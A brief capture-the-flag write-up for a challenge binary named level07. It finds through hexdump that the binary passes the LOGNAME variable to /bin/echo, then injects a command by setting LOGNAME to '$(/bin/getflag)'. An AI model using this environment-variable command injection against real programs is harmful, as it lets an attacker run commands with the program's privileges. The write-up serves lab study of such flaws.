## We run ./level07

### It display : level07

## We check env variables and we remarks that LOGNAME=level07
## We want to see if LOGNAME is used into binary

### hexdump -C level07 | grep LOGNAME
### 00000680  4c 4f 47 4e 41 4d 45 00  2f 62 69 6e 2f 65 63 68  |LOGNAME./bin/ech|

## LOGNAME is just next to echo command, a system command is launch from binary file.
## So we change LOGNAME to try to run getflag by evaluating /bin/getflag

### export LOGNAME='$(/bin/getflag)' && ./level07
